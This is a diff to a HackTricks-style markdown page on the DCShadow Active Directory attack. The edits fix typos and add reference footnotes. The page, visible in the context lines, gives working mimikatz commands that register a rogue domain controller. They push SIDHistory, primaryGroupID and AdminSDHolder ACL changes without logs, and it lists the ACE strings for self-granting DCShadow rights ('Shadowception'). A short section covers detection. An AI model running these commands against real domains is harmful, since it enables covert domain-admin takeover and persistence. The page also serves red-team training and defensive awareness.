@@ -6,7 +6,7 @@
 ## Basic Information
 
 It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Note that if you use wrong data, pretty ugly logs will appear.<sup>[[2]](#references)</sup>
 
 To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
 
@@ -45,20 +45,20 @@ For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
 
-```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
+```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
 
 ```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
-(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
 
 ### Primary group abuse, enumeration gaps, and detection
 
-- `primaryGroupID` is a separate attribute from the group `member` list. DCShadow/DSInternals can write it directly (e.g., set `primaryGroupID=512` for **Domain Admins**) without on-box LSASS enforcement, but AD still **moves** the user: changing PGID always strips membership from the previous primary group (same behavior for any target group), so you cannot keep the old primary-group membership.
+- `primaryGroupID` is a separate attribute from the group `member` list. DCShadow/DSInternals can write it directly (e.g., set `primaryGroupID=512` for **Domain Admins**) without on-box LSASS enforcement, but AD still **moves** the user: changing PGID always strips membership from the previous primary group (same behavior for any target group), so you cannot keep the old primary-group membership.<sup>[[1]](#references)</sup>
 - Default tools prevent removing a user from their current primary group (`ADUC`, `Remove-ADGroupMember`), so changing PGID typically requires direct directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
 - Membership reporting is inconsistent:
   - **Includes** primary-group-derived members: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
@@ -82,11 +82,11 @@ Get-ADUser -Filter * -Properties primaryGroupID |
   Select-Object Name,SamAccountName
 ```
 
-Cross-check privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch discrepancies introduced by `primaryGroupID` or hidden attributes.
+Cross-check privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch discrepancies introduced by `primaryGroupID` or hidden attributes.<sup>[[1]](#references)</sup>
 
 ## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
 
-We need to append following ACEs with our user's SID at the end:
+We need to append following ACEs with our user's SID at the end:<sup>[[2]](#references)</sup>
 
 - On the domain object:
   - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
@@ -96,18 +96,15 @@ We need to append following ACEs with our user's SID at the end:
 - On the target user object: `(A;;WP;;;UserSID)`
 - On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
+In this case you need to make **several changes**, not just one. In the **mimikatz1 session** (RPC server), use the **`/stack` parameter with each change**. You then need to **`/push`** only once to apply all stacked changes from the rogue server.
 
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>
 
 ## References
 
-- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
-- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
+- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
